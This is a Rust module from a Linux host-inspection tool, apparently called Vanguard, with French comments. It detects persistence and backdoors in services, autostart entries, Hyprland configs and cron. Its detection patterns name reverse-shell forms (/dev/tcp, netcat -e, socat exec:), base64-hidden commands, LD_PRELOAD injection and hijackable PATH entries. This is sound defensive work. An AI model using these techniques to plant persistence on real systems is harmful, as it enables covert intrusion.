//! Ce qui se cache : persistance (préchargement, services, démarrage de session, cron), programmes
//! privilégiés hors paquet ou modifiés, PATH piégeable.

#![warn(clippy::arithmetic_side_effects, clippy::as_conversions)]

use super::designes::{self, Designe};
use super::*;
use crate::machine::temoins;

mod permise;
mod shell;

/// /usr/bin/x → /bin/x (idem sbin, lib) : chemin d'avant la fusion de /usr.
pub(super) fn chemin_hors_usr(fichier: &Path) -> Option<std::path::PathBuf> {
    let reste = fichier.strip_prefix("/usr").ok()?;
    ["bin", "sbin", "lib", "lib64"]
        .iter()
        .any(|d| reste.starts_with(d))
        .then(|| Path::new("/").join(reste))
}

/// Paquet donné par « dpkg -S » : « libc6:amd64, libc6-dbg: /chemin » → « libc6:amd64 ». Les lignes
/// « diversion by … » parlent d'un fichier détourné, pas de son propriétaire.
pub(super) fn paquet_dpkg(texte: &str) -> Option<String> {
    texte
        .lines()
        .filter(|l| !l.starts_with("diversion "))
        .find_map(|l| l.split_once(": ")?.0.split(", ").next().map(str::to_string))
}

/// Empreinte SHA-256 enregistrée pour ce fichier dans le mtree d'un paquet pacman (« ./usr/bin/sudo … sha256digest=… »).
pub(super) fn empreinte_mtree(mtree: &str, fichier: &Path) -> Option<String> {
    let debut = format!(".{} ", fichier.display());
    mtree
        .lines()
        .find(|l| l.starts_with(&debut))?
        .split_whitespace()
        .find_map(|c| c.strip_prefix("sha256digest="))
        .map(str::to_string)
}

/// Sortie de dpkg --verify ou rpm -V : le 3e caractère vaut « 5 » quand le contenu (empreinte) a changé.
/// Les autres différences (date, droits) ne prouvent pas un remplacement du programme.
pub(super) fn contenu_modifie(verif: &str, fichier: &Path) -> bool {
    let chemin = fichier.to_string_lossy();
    verif
        .lines()
        .any(|l| l.split_whitespace().last() == Some(&*chemin) && l.chars().nth(2) == Some('5'))
}

/// Dossiers du PATH dangereux : modifiables par tout le monde (sans « sticky bit ») ou relatifs (« . »).
pub(super) fn path_dangereux(path: &str, droits: impl Fn(&str) -> Option<u32>) -> Vec<String> {
    path.split(':')
        .filter(|d| d.is_empty() || !d.starts_with('/') || droits(d).is_some_and(|m| m & 0o002 != 0 && m & 0o1000 == 0))
        .map(|d| {
            if d.is_empty() {
                "(vide = dossier courant)".to_string()
            } else {
                d.to_string()
            }
        })
        .collect()
}

/// Un fichier de démarrage ou de configuration tel qu'il est montré : « ~/… » sous le dossier personnel `maison`, et
/// rendu inoffensif (dans /etc/profile.d ou ~/.config/autostart, le nom est celui qu'a choisi qui a posé le fichier).
pub(super) fn court(p: &Path, maison: &Path) -> String {
    crate::ui::affichable(
        &p.strip_prefix(maison)
            .map_or_else(|_| p.display().to_string(), |r| format!("~/{}", r.display())),
    )
}

/// Ligne de configuration vide ou en commentaire (shell, systemd, .desktop : « # » ; Lua : « -- » ; « ; »).
pub(super) fn commentaire(ligne: &str) -> bool {
    let l = ligne.trim_start();
    l.is_empty() || l.starts_with('#') || l.starts_with("--") || l.starts_with(';') || l.starts_with("//")
}

/// Dossiers cachés du dossier personnel où vivent normalement des programmes.
pub(super) const DOSSIERS_CACHES_NORMAUX: [&str; 10] = [
    ".local",
    ".config",
    ".cargo",
    ".rustup",
    ".nix-profile",
    ".npm-global",
    ".bun",
    ".deno",
    ".dotnet",
    ".steam",
];

/// Pourquoi cette commande a la forme d'une porte dérobée, ou `None` : shell inversé, téléchargé ou décodé puis passé
/// à un interpréteur, code caché en base64. Une telle ligne n'est jamais déclarable normale, quelle que soit sa
/// syntaxe (`cibles`).
pub(super) fn raison_grave(commande: &str) -> Option<&'static str> {
    // Les mots coupés aussi sur ce qui sépare ou groupe les commandes du shell, comme pour la chasse :
    // « (nc -e /bin/sh … &) » ou « x;nc -e … » cachaient nc dans « (nc » ou « x;nc ». Un programme se compare par
    // son nom de fichier (« /bin/nc »), une option telle quelle.
    let mots_du_shell: Vec<&str> = crate::machine::chasse::mots(commande)
        .into_iter()
        .map(|(m, _)| m.trim_matches(|c| c == '"' || c == '\''))
        .collect();
    let a = |m: &str| {
        mots_du_shell
            .iter()
            .any(|x| *x == m || crate::machine::chasse::nom_de_fichier(x) == m)
    };
    if commande.contains("/dev/tcp/") || commande.contains("/dev/udp/") {
        return Some(tr!(
            "connexion réseau ouverte par le shell (shell inversé)",
            "network connection opened by the shell (reverse shell)"
        ));
    }
    // « -e », « -c », « --exec », « --sh-exec », aussi collés à leur valeur (« -e/bin/sh », « --exec=… »).
    let donne_un_shell = mots_du_shell.iter().any(|x| {
        ["-e", "-c", "--exec", "--sh-exec", "--lua-exec"].iter().any(|o| {
            x.strip_prefix(o)
                .is_some_and(|r| r.is_empty() || r.starts_with(['=', '/']))
        })
    });
    if (a("nc") || a("ncat") || a("netcat")) && donne_un_shell {
        return Some(tr!(
            "netcat qui donne un shell (shell inversé)",
            "netcat giving a shell (reverse shell)"
        ));
    }
    let minuscules = commande.to_ascii_lowercase();
    if a("socat") && (minuscules.contains("exec:") || minuscules.contains("system:")) {
        return Some(tr!(
            "socat qui donne un shell (shell inversé)",
            "socat giving a shell (reverse shell)"
        ));
    }
    // Téléchargé ou décodé puis passé à un interpréteur : le même jugement que pour les programmes en marche.
    if let Some(motif) = crate::machine::chasse::passe_a_un_shell(commande) {
        return Some(motif.raison);
    }
    if commande.contains("base64 -d") || commande.contains("base64 --decode") {
        return Some(tr!("commande cachée en base64", "command hidden in base64"));
    }
    None
}

/// Pourquoi cette commande lancée automatiquement ressemble à une porte dérobée, ou `None`. `lancement` : la ligne
/// est une commande lancée (service, démarrage de session), pas un fichier de configuration du shell, où « /tmp »
/// apparaît sans rien lancer. Seules des formes précises sont retenues, pour ne pas alerter sur chaque script maison.
pub(super) fn commande_suspecte(commande: &str, lancement: bool) -> Option<&'static str> {
    commande_suspecte_chez(commande, lancement, &[&home()])
}

/// `commande_suspecte`, un dossier caché se jugeant sous chacun des dossiers personnels `maisons` (celui de la
/// session qui lit, celui de la lecture, s'ils diffèrent : une forme finale de systemd y développe « %h »).
fn commande_suspecte_chez(commande: &str, lancement: bool, maisons: &[&str]) -> Option<&'static str> {
    if let Some(raison) = raison_grave(commande) {
        return Some(raison);
    }
    if !lancement {
        return None;
    }
    // Coupée sur tout blanc, Unicode compris : plus de mots jugés, jamais moins (le témoin, lui, refuse un tel blanc).
    let mots: Vec<&str> = commande
        .split_whitespace()
        .map(|m| m.trim_matches(|c| c == '"' || c == '\''))
        .collect();
    // Programme lancé : premier mot, sans les préfixes de systemd (« -/usr/bin/x », « @ », « + », « ! », « !! »,
    // « : », « | » de systemd 262).
    let programme = mots.first()?.trim_start_matches(['-', '@', '+', '!', ':', '|']);
    // Un interpréteur ou un lanceur (« /usr/bin/bash ~/.x/a.sh », « env /tmp/x ») : ce qu'il lit ou lance se juge
    // comme le programme lui-même.
    let mut a_juger = vec![programme];
    if designes::lit_un_script(programme) {
        a_juger.extend(mots.iter().skip(1).copied());
    }
    for p in a_juger {
        for maison in maisons {
            if let Some(raison) = programme_cache(p, maison) {
                return Some(raison);
            }
        }
    }
    None
}

/// Un chemin simplifié comme le lit le noyau, sans suivre de lien : « // » et « /./ » ôtés, « dossier/.. » retiré
/// (« /var/../tmp/x » est « /tmp/x » ; relecture adverse, C2). Un chemin relatif garde son premier mot (« ~ »,
/// « $HOME », « %h »), qu'un « .. » ne retire pas.
fn chemin_simplifie(p: &str) -> String {
    if !p.contains("//") && !p.contains("/.") {
        return p.to_string();
    }
    let absolu = p.starts_with('/');
    let mut morceaux: Vec<&str> = Vec::new();
    for (i, m) in p.split('/').enumerate() {
        if !absolu && i == 0 {
            morceaux.push(m);
            continue;
        }
        match m {
            "" | "." => {}
            ".." if morceaux.len() > usize::from(!absolu) && morceaux.last() != Some(&"..") => {
                morceaux.pop();
            }
            ".." if absolu => {}
            _ => morceaux.push(m),
        }
    }
    let corps = morceaux.join("/");
    if absolu { format!("/{corps}") } else { corps }
}

/// Un programme lancé depuis un dossier temporaire ou un dossier caché du dossier personnel `maison`.
fn programme_cache(programme: &str, maison: &str) -> Option<&'static str> {
    chemin_cache(programme, maison, false)
}

/// Les dossiers cachés du dossier personnel qui gardent des données, pas des programmes : un argument qui y mène
/// (« ssh -F ~/.ssh/config ») n'est pas levé ; un programme qui s'y trouve, si.
const DOSSIERS_DE_DONNEES: [&str; 8] = [
    ".ssh",
    ".gnupg",
    ".mozilla",
    ".thunderbird",
    ".icons",
    ".themes",
    ".fonts",
    ".password-store",
];

/// Le chemin sans « /proc/self/root », « /proc/thread-self/root » ni « /proc/<numéro>/root » en tête : la racine
/// vue par un processus, la même ici (relecture adverse 2, N4).
fn sans_racine_de_proc(p: &str) -> &str {
    let mut p = p;
    while let Some(reste) = p.strip_prefix("/proc/") {
        let Some((qui, apres)) = reste.split_once('/') else {
            break;
        };
        let processus =
            qui == "self" || qui == "thread-self" || (!qui.is_empty() && qui.bytes().all(|b| b.is_ascii_digit()));
        // « /proc/self/task/<n>/root » : la même racine, vue par un fil du processus (vérification 3, P7).
        let apres = match apres.strip_prefix("task/").and_then(|t| t.split_once('/')) {
            Some((fil, reste)) if !fil.is_empty() && fil.bytes().all(|b| b.is_ascii_digit()) => reste,
            _ => apres,
        };
        match apres.strip_prefix("root") {
            Some(r) if processus && (r.is_empty() || r.starts_with('/')) => p = r,
            _ => break,
        }
    }
    p
}

/// Un chemin (programme, ou `argument` d'un programme) dans un dossier temporaire (/tmp, /var/tmp, /dev/shm, le
/// dossier de session /run/user/…), ou dans un dossier caché d'un dossier personnel : `maison`, ou celui d'un autre
/// compte (« `/home/<nom>/` », « `/var/home/<nom>/` », « /root/ ») quand il ne contient pas `maison`.
fn chemin_cache(programme: &str, maison: &str, argument: bool) -> Option<&'static str> {
    let simple = chemin_simplifie(programme);
    let programme = sans_racine_de_proc(&simple);
    if temporaire(programme) {
        return Some(tr!(
            "programme lancé depuis un dossier temporaire",
            "program started from a temporary folder"
        ));
    }
    let relatif = programme
        .strip_prefix("~/")
        .or_else(|| programme.strip_prefix("$HOME/"))
        .or_else(|| programme.strip_prefix("${HOME}/"))
        .or_else(|| programme.strip_prefix("%h/"))
        .or_else(|| {
            (!maison.is_empty())
                .then(|| programme.strip_prefix(&format!("{maison}/")))
                .flatten()
        })
        .or_else(|| maison_d_un_compte(programme, maison));
    if let Some(r) = relatif {
        let premier = r.split('/').next().unwrap_or("");
        if premier.starts_with('.')
            && r.contains('/')
            && !DOSSIERS_CACHES_NORMAUX.contains(&premier)
            && !(argument && DOSSIERS_DE_DONNEES.contains(&premier))
        {
            return Some(tr!(
                "programme rangé dans un dossier caché du dossier personnel",
                "program stored in a hidden folder of the home folder"
            ));
        }
    }
    None
}

/// Un chemin (simplifié) dans un dossier temporaire : /tmp, /var/tmp, /dev/shm, un dossier de session
/// (/run/user/…, qu'efface la fin de la session ; /var/run/user/…, le même), un dossier de verrous ouvert à tous ;
/// ou le dossier courant, un descripteur ou une projection d'un processus (/proc/self/cwd/…, `/proc/<n>/fd/…`) : un
/// fichier qu'on ne voit pas sur le disque (vérification 3, P7).
fn temporaire(p: &str) -> bool {
    const DOSSIERS: [&str; 9] = [
        "/tmp/",
        "/var/tmp/",
        "/dev/shm/",
        "/run/user/",
        "/var/run/user/",
        "/run/lock/",
        "/var/run/lock/",
        "/var/lock/",
        "/dev/mqueue/",
    ];
    DOSSIERS.iter().any(|d| p.starts_with(d)) || vue_d_un_processus(p)
}

/// « `/proc/<self|thread-self|n>/(cwd|fd|map_files)/…` », aussi par « `task/<n>/` ».
fn vue_d_un_processus(p: &str) -> bool {
    let Some((qui, apres)) = p.strip_prefix("/proc/").and_then(|r| r.split_once('/')) else {
        return false;
    };
    let nombre = |x: &str| !x.is_empty() && x.bytes().all(|b| b.is_ascii_digit());
    if !(qui == "self" || qui == "thread-self" || nombre(qui)) {
        return false;
    }
    let apres = match apres.strip_prefix("task/").and_then(|t| t.split_once('/')) {
        Some((fil, reste)) if nombre(fil) => reste,
        _ => apres,
    };
    ["cwd", "fd", "map_files"].iter().any(|d| {
        apres
            .strip_prefix(d)
            .is_some_and(|r| r.is_empty() || r.starts_with('/'))
    })
}

/// `chemin_cache` sous le dossier personnel de `maisons` qui contient le chemin, le plus long (le plus précis : celui
/// de la lecture sous celui de la session), ou sous chacun si aucun ne le contient.
fn chemin_cache_chez(p: &str, maisons: &[&str], argument: bool) -> Option<&'static str> {
    let precise = maisons
        .iter()
        .filter(|m| !m.is_empty() && (p == **m || p.starts_with(&format!("{m}/"))))
        .max_by_key(|m| m.len());
    match precise {
        Some(m) => chemin_cache(p, m, argument),
        None => maisons.iter().find_map(|m| chemin_cache(p, m, argument)),
    }
}

/// Le reste de `p` sous le dossier personnel d'un compte (« `/home/<nom>/` », « `/var/home/<nom>/` », « /root/ ») qui
/// ne contient pas `maison` (celui-là se lit par `maison`, plus précis) : « /home/%u/.x/agent » d'une unité.
fn maison_d_un_compte<'a>(p: &'a str, maison: &str) -> Option<&'a str> {
    let (racine, reste) = if let Some(r) = p.strip_prefix("/root/") {
        ("/root/".to_string(), r)
    } else {
        let base = ["/home/", "/var/home/"].into_iter().find(|b| p.starts_with(b))?;
        let (nom, reste) = p.get(base.len()..)?.split_once('/')?;
        if nom.is_empty() {
            return None;
        }
        (format!("{base}{nom}/"), reste)
    };
    (!format!("{maison}/").starts_with(&racine)).then_some(reste)
}

/// La raison d'une ligne de shell que Vanguard ne coupe pas sûrement.
fn shell_non_lu() -> &'static str {
    tr!(
        "ligne de shell que Vanguard ne lit pas sûrement (variable, joker, « ~nom », guillemet non fermé, boucle ou document en ligne) : ce qu'elle lance n'est pas vérifié",
        "shell line Vanguard cannot read safely (variable, wildcard, “~name”, unclosed quote, loop or here-document): what it starts is not checked"
    )
}

/// La raison d'une variable qui fait charger du code depuis un dossier caché ou temporaire.
fn variable_cachee() -> &'static str {
    tr!(
        "variable qui fait chercher programmes, bibliothèques ou code dans un dossier caché ou temporaire (PATH, BASH_ENV, PYTHONPATH…)",
        "variable that makes programs, libraries or code be looked up in a hidden or temporary folder (PATH, BASH_ENV, PYTHONPATH…)"
    )
}

/// La raison d'une bibliothèque préchargée.
fn prechargee() -> &'static str {
    tr!(
        "bibliothèque préchargée (LD_PRELOAD, LD_AUDIT) dans ce qui se lance",
        "library preloaded (LD_PRELOAD, LD_AUDIT) into what starts"
    )
}

/// Le nom et la valeur d'une affectation « NOM=valeur » (nom du shell), ou `None`.
fn affectation(mot: &str) -> Option<(&str, &str)> {
    let (nom, valeur) = mot.split_once('=')?;
    let mut lettres = nom.chars();
    let premiere = lettres.next()?;
    ((premiere.is_ascii_alphabetic() || premiere == '_') && lettres.all(|c| c.is_ascii_alphanumeric() || c == '_'))
        .then_some((nom, valeur))
}

/// Pourquoi poser `nom` à `valeur` change ce qui se lance, ou `None` : une bibliothèque préchargée (LD_PRELOAD,
/// LD_AUDIT, quelle que soit sa valeur), ou une variable de recherche ou d'injection (PATH, `variable_d_injection`)
/// dont un morceau mène à un dossier caché ou temporaire. Un dossier visible du compte n'est pas levé (modèle de
/// menace).
fn variable_suspecte(nom: &str, valeur: &str, maisons: &[&str]) -> Option<&'static str> {
    let valeur = valeur.trim_matches(|c| c == '"' || c == '\'');
    if ["LD_PRELOAD", "LD_AUDIT"].contains(&nom) {
        return (!valeur.trim().is_empty()).then(prechargee);
    }
    // Une adresse de bus « unixexec: » lance le programme qu'elle nomme à chaque connexion (vérification 3, P11).
    if nom.starts_with("DBUS_") && valeur.contains("unixexec:") {
        return Some(tr!(
            "adresse de bus D-Bus « unixexec: » : chaque programme qui s'y connecte lance le programme qu'elle nomme",
            "D-Bus address “unixexec:”: each program that connects to it starts the program it names"
        ));
    }
    if variable_de_programme(nom) {
        let cache = valeur
            .split(|c: char| c.is_whitespace() || matches!(c, '=' | ':' | '|' | '"' | '\'' | ';'))
            .filter(|m| m.starts_with(['/', '~', '$']))
            .any(|m| chemin_cache_chez(m, maisons, false).is_some());
        return cache.then(variable_cachee);
    }
    if nom != "PATH" && !variable_d_injection(nom) {
        return None;
    }
    let cache = valeur
        .split(|c: char| c == ':' || c == ';' || c == ',' || c.is_whitespace() || c == '=')
        .filter(|m| m.starts_with(['/', '~', '$']))
        .any(|m| {
            let dedans = format!("{}/x", m.trim_end_matches('/'));
            chemin_cache_chez(&dedans, maisons, false).is_some()
        });
    cache.then(variable_cachee)
}

/// Une variable qui nomme un programme que d'autres lancent (mot de passe demandé, éditeur, pager, terminal,
/// navigateur, shell) : sa valeur se lance comme une commande (vérification 3, P11).
fn variable_de_programme(nom: &str) -> bool {
    const NOMS: [&str; 17] = [
        "SSH_ASKPASS",
        "SUDO_ASKPASS",
        "GIT_ASKPASS",
        "GIT_SSH",
        "GIT_SSH_COMMAND",
        "SHELL",
        "EDITOR",
        "VISUAL",
        "PAGER",
        "MANPAGER",
        "GIT_PAGER",
        "GIT_EDITOR",
        "BROWSER",
        "TERMINAL",
        "GAMEMODERUNEXEC",
        "LESSOPEN",
        "LESSCLOSE",
    ];
    NOMS.contains(&nom)
}

/// Les programmes qui en lancent un autre, ou lisent du code, d'après leurs arguments, en plus de
/// `designes::lit_un_script` (relecture adverse 2, N7) : chargeur de bibliothèques, enveloppes de jeux ou de
/// terminal, lanceurs d'Omarchy et de Hyprland, outils dont une option lance une commande.
fn enveloppe(programme: &str) -> bool {
    let nom = crate::machine::chasse::nom_de_fichier(programme);
    nom.starts_with("ld-linux")
        || nom.starts_with("ld-musl")
        || nom.starts_with("omarchy-launch")
        || [
            "ld.so",
            "gamemoderun",
            "prime-run",
            "mangohud",
            "gamescope",
            "xdg-terminal-exec",
            "xdg-open",
            "hyprctl",
            "find",
            "make",
            "vim",
            "nvim",
            "vi",
            "git",
            "ssh",
            "tar",
            "rsync",
            "zip",
            "less",
            "man",
        ]
        .contains(&nom)
}

/// Un shell qui lit une commande par « -c ».
fn shell_qui_lit_c(programme: &str) -> bool {
    [
        "sh", "bash", "dash", "zsh", "ksh", "mksh", "ash", "yash", "fish", "rbash", "busybox",
    ]
    .contains(&crate::machine::chasse::nom_de_fichier(programme))
}

/// Pourquoi un argument d'un programme mène à un dossier temporaire ou caché, ou `None` : l'argument coupé sur ce qui
/// sépare un chemin d'une option ou d'une autre valeur (« --x=/tmp/.x/a », « -S/tmp/.x/s », « a:b »,
/// « 'os.system(\"/tmp/.x/a\")' »). `caches` : les dossiers cachés comptent aussi (sinon les seuls temporaires).
fn argument_cache(argument: &str, maisons: &[&str], caches: bool) -> Option<&'static str> {
    argument
        .split(|c: char| {
            c.is_whitespace()
                || matches!(
                    c,
                    '=' | ':'
                        | ','
                        | '\''
                        | '"'
                        | '('
                        | ')'
                        | ';'
                        | '`'
                        | '['
                        | ']'
                        | '{'
                        | '}'
                        | '<'
                        | '>'
                        | '|'
                        | '&'
                )
        })
        .filter_map(|m| {
            // « -S/tmp/x » : l'option collée ôtée.
            let debut = m.find(['/', '~', '$'])?;
            let option = m.get(..debut)?;
            (option.is_empty()
                || (option.starts_with('-') && option.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')))
            .then(|| m.get(debut..))
            .flatten()
        })
        .find_map(|m| {
            if !caches && !temporaire(sans_racine_de_proc(&chemin_simplifie(m))) {
                return None;
            }
            chemin_cache_chez(m, maisons, true)
        })
}

/// Les mots-clés du shell qui ouvrent ou ferment un bloc sans rien lancer.
const MOTS_CLES_SHELL: [&str; 11] = [
    "if", "then", "else", "elif", "fi", "do", "done", "while", "until", "!", "{",
];

/// Pourquoi une ligne de shell (ce que Hyprland passe à « /bin/sh -c », un « exec_cmd » Lua, une ligne de cron)
/// ressemble à une porte dérobée, chaque commande simple jugée (relecture adverse 2, N1) ; `Err` si elle ne se lit pas
/// sûrement (`shell::commandes`, ou un programme dont le nom ne se connaît qu'au lancement). `tout_argument` : le
/// fichier s'écrit par le compte ; un argument de n'importe quel programme qui mène à un dossier temporaire se juge.
fn ligne_de_shell_suspecte(ligne: &str, maisons: &[&str], tout_argument: bool) -> Result<Option<&'static str>, ()> {
    ligne_de_shell_a(ligne, maisons, tout_argument, 0)
}

fn ligne_de_shell_a(
    ligne: &str,
    maisons: &[&str],
    tout_argument: bool,
    profondeur: u32,
) -> Result<Option<&'static str>, ()> {
    if profondeur > 8 {
        return Err(());
    }
    if let Some(raison) = raison_grave(ligne) {
        return Ok(Some(raison));
    }
    let mut dossier = Courant::Maison;
    for simple in shell::commandes(ligne)? {
        let raison = simple_suspecte(&simple, &mut dossier, maisons, tout_argument, profondeur)?;
        if raison.is_some() {
            return Ok(raison);
        }
    }
    Ok(None)
}

/// Le dossier courant d'une ligne de shell, que « cd » change : le dossier personnel tant qu'aucun « cd », un
/// chemin écrit, ou inconnu (un « cd » qui ne se lit pas sûrement).
enum Courant {
    Maison,
    Connu(String),
    Inconnu,
}

/// Une commande simple d'une ligne de shell (`ligne_de_shell_suspecte`), ou d'une unité une fois coupée par systemd.
fn simple_suspecte(
    simple: &shell::Simple,
    dossier: &mut Courant,
    maisons: &[&str],
    tout_argument: bool,
    profondeur: u32,
) -> Result<Option<&'static str>, ()> {
    use shell::Flou;
    let mut k = 0_usize;
    while let Some(m) = simple.mots.get(k) {
        if m.flou == Flou::Aucun && MOTS_CLES_SHELL.contains(&m.texte.as_str()) {
            k = k.saturating_add(1);
            continue;
        }
        if let Some((nom, valeur)) = affectation(&m.texte) {
            if let Some(raison) = variable_suspecte(nom, valeur, maisons) {
                return Ok(Some(raison));
            }
            if m.flou != Flou::Aucun && (nom == "PATH" || variable_d_injection(nom)) {
                return Err(());
            }
            k = k.saturating_add(1);
            continue;
        }
        break;
    }
    let mots = simple.mots.get(k..).unwrap_or_default();
    let Some(premier) = mots.first() else {
        return Ok(None);
    };
    if premier.flou != Flou::Aucun {
        return Err(());
    }
    let nom = premier.texte.as_str();
    if ["for", "case", "select", "function", "coproc"].contains(&nom) || nom.ends_with("()") {
        return Err(());
    }
    if nom == "cd" || nom == "pushd" {
        *dossier = match mots.get(1) {
            None => Courant::Connu("~".to_string()),
            Some(d) if d.flou == Flou::Aucun && (d.texte.starts_with(['/', '~']) || d.texte.starts_with("$HOME")) => {
                Courant::Connu(d.texte.clone())
            }
            Some(d) if d.flou == Flou::Aucun && !d.texte.starts_with('-') => match dossier {
                Courant::Connu(ici) => Courant::Connu(format!("{ici}/{}", d.texte)),
                Courant::Inconnu => Courant::Inconnu,
                Courant::Maison => Courant::Connu(format!("~/{}", d.texte)),
            },
            Some(_) => Courant::Inconnu,
        };
        return Ok(None);
    }
    // Un programme nommé par un chemin relatif se cherche dans le dossier courant.
    let programme = if nom.contains('/') && !nom.starts_with(['/', '~']) && !nom.starts_with("$HOME") {
        match dossier {
            Courant::Connu(ici) => format!("{ici}/{nom}"),
            Courant::Inconnu => return Err(()),
            Courant::Maison => format!("~/{nom}"),
        }
    } else {
        nom.to_string()
    };
    if let Some(raison) = chemin_cache_chez(&programme, maisons, false) {
        return Ok(Some(raison));
    }
    let lanceur = designes::lit_un_script(&programme) || enveloppe(&programme);
    let arguments = mots.get(1..).unwrap_or_default();
    for (i, a) in arguments.iter().enumerate() {
        if lanceur && a.flou != Flou::Aucun {
            return Err(());
        }
        if a.flou != Flou::Aucun {
            continue;
        }
        if lanceur
            && let Some((n, v)) = affectation(&a.texte)
            && let Some(raison) = variable_suspecte(n, v, maisons)
        {
            return Ok(Some(raison));
        }
        if (lanceur || tout_argument)
            && let Some(raison) = argument_cache(&a.texte, maisons, lanceur)
        {
            return Ok(Some(raison));
        }
        // « sh -c ligne », « bash -lc ligne », « sh -c/tmp/x » : la ligne lue comme une ligne de shell.
        // Le mot avant ses options : le shell qui lit « -c » (« kitty -e bash -l -c … »).
        let shell = std::iter::once(premier)
            .chain(arguments.get(..i).unwrap_or_default())
            .rev()
            .find(|p| !p.texte.starts_with('-'))
            .is_some_and(|p| shell_qui_lit_c(&p.texte));
        if let Some(c) = a.texte.strip_prefix('-')
            && shell
            && !c.starts_with('-')
            && let Some(position) = c.find('c')
        {
            let colle = c.get(position.saturating_add(1)..).unwrap_or_default();
            let a_lire = if colle.is_empty() {
                arguments.get(i.saturating_add(1)).map(|m| m.texte.clone())
            } else {
                Some(colle.to_string())
            };
            if let Some(l) = a_lire {
                let r = ligne_de_shell_a(&l, maisons, tout_argument, profondeur.saturating_add(1))?;
                if r.is_some() {
                    return Ok(r);
                }
            }
        }
    }
    // « hyprctl dispatch exec … » : la commande que Hyprland lancera, lue comme une ligne de shell.
    if crate::machine::chasse::nom_de_fichier(&programme) == "hyprctl"
        && let Some(p) = arguments.iter().position(|a| a.texte == "dispatch")
        && arguments.get(p.saturating_add(1)).is_some_and(|a| a.texte == "exec")
    {
        let reste: Vec<&str> = arguments
            .get(p.saturating_add(2)..)
            .unwrap_or_default()
            .iter()
            .map(|a| a.texte.as_str())
            .collect();
        let reste = reste.join(" ");
        let sans_regles = match reste.strip_prefix('[') {
            Some(r) => r.split_once(']').map_or("", |(_, c)| c),
            None => &reste,
        };
        let r = ligne_de_shell_a(sans_regles, maisons, tout_argument, profondeur.saturating_add(1))?;
        if r.is_some() {
            return Ok(r);
        }
    }
    // Une entrée redirigée vers un interpréteur (« sh </tmp/.x/s ») est son script.
    if lanceur {
        for e in &simple.entrees {
            if e.flou != Flou::Aucun {
                return Err(());
            }
            if let Some(raison) = argument_cache(&e.texte, maisons, true) {
                return Ok(Some(raison));
            }
        }
    }
    Ok(None)
}

/// Commande lancée par une ligne de démarrage : « ExecStart=… » (systemd), « Exec=… » (.desktop),
/// « exec-once = … » (Hyprland), « o.exec_on_start("…") » (Omarchy en Lua). `None` si la ligne ne lance rien.
pub(super) fn commande_lancee(ligne: &str) -> Option<String> {
    commande_lancee_lue(ligne).map(|(c, _)| c)
}

/// `commande_lancee`, et si elle est ambiguë : une ligne Lua où du texte suit le dernier guillemet, ou dont la
/// commande garde un guillemet (« o.exec_on_start("/x/run" .. suffixe) » lance autre chose que « /x/run »). Jugée
/// quand même ; seul le choix « normal » la refuse.
fn commande_lancee_lue(ligne: &str) -> Option<(String, bool)> {
    let l = ligne.trim();
    if commentaire(l) {
        return None;
    }
    if let Some((cle, valeur)) = l.split_once('=') {
        let cle = cle.trim();
        if cle.starts_with("Exec") || ["exec-once", "exec", "execr", "execr-once", "exec-shutdown"].contains(&cle) {
            return Some((valeur.trim().to_string(), false));
        }
    }
    if ["exec_on_start", "launch_on_start", "exec_once", "exec-once"]
        .iter()
        .any(|m| l.contains(m))
    {
        let debut = l.find(['"', '\''])?;
        let fin = l.rfind(['"', '\''])?;
        // `get` rend `None` quand la fin précède le début : le même cas que `fin > debut` refusait.
        let dedans = l.get(debut.checked_add(1)?..fin)?;
        let apres = l.get(fin.checked_add(1)?..).unwrap_or_default();
        // Avant le premier guillemet, seul le nom de l'appel et sa parenthèse : « f(x .. "/y") » lance autre chose
        // que « /y » (relecture adverse, M3).
        let avant = l.get(..debut).unwrap_or_default().trim_end_matches([' ', '\t']);
        let ambigue = dedans.contains(['"', '\''])
            || apres.contains(|c: char| !matches!(c, ')' | ',' | ';' | ' ' | '\t'))
            || !avant.ends_with('(');
        return Some((dedans.to_string(), ambigue));
    }
    None
}

/// Ligne qui précharge une bibliothèque dans tous les programmes (LD_PRELOAD, LD_AUDIT) ; « unset » la retire.
pub(super) fn definit_prechargement(ligne: &str) -> bool {
    !commentaire(ligne)
        && (ligne.contains("LD_PRELOAD") || ligne.contains("LD_AUDIT"))
        && !ligne.trim_start().starts_with("unset")
}

/// Fichiers d'un dossier (et de ses sous-dossiers « *.d » de systemd, ou de tous ceux de ~/.config/hypr), liens vers
/// un fichier compris ; les liens d'activation (dossiers « *.wants ») ne sont pas parcourus. Un dossier « *.d » qui est
/// un lien vers un dossier se suit, comme systemd le suit (relecture adverse, C4 ; `liens_d_ajouts` le signale).
pub(super) fn fichiers_de(dossier: &Path, extensions: &[&str]) -> Vec<std::path::PathBuf> {
    fichiers_et_liens(dossier, extensions, &mut Vec::new())
}

/// `fichiers_de`, et dans `liens` les dossiers « *.d » suivis qui sont des liens vers un dossier : un tel lien posé
/// par le compte est déjà un indice (relecture adverse, C4).
fn fichiers_et_liens(
    dossier: &Path,
    extensions: &[&str],
    liens: &mut Vec<std::path::PathBuf>,
) -> Vec<std::path::PathBuf> {
    let mut trouve = Vec::new();
    let mut parcours = Parcours::default();
    fichiers_sous(
        dossier,
        extensions,
        dossier.ends_with("hypr"),
        0,
        &mut trouve,
        &mut parcours,
    );
    liens.append(&mut parcours.liens);
    trouve
}

/// Les fichiers d'un dossier de modules de Hyprland (~/.config/hypr, ou un dossier de modules d'Omarchy), à toute
/// profondeur, et dans `parcours` ce qui s'y lit mal : un sous-dossier qui est un lien vers un dossier (suivi), un
/// dossier trop profond (non lu). Lua y prend un module par son nom (« require("a.b") »), lien suivi ; Vanguard le
/// lit aussi, et dit les deux (deuxième vérification, N10).
fn fichiers_de_hypr(dossier: &Path, parcours: &mut Parcours) -> Vec<std::path::PathBuf> {
    let mut trouve = Vec::new();
    fichiers_sous(dossier, &["conf", "lua"], true, 0, &mut trouve, parcours);
    trouve
}

/// Au plus autant de dossiers parcourus l'un dans l'autre par `fichiers_de`.
const PROFONDEUR_MAX: u32 = 8;

/// Ce que le parcours d'un dossier trouve à dire en plus de ses fichiers.
#[derive(Default)]
struct Parcours {
    /// Les dossiers « *.d » suivis qui sont des liens vers un dossier (relecture adverse, C4).
    liens: Vec<std::path::PathBuf>,
    /// Les sous-dossiers d'un dossier de Hyprland qui sont des liens vers un dossier : suivis, et dits.
    liens_hypr: Vec<std::path::PathBuf>,
    /// Les dossiers non parcourus, au-delà de `PROFONDEUR_MAX` niveaux : ce qu'ils lancent n'est pas vérifié.
    trop_profonds: Vec<std::path::PathBuf>,
}

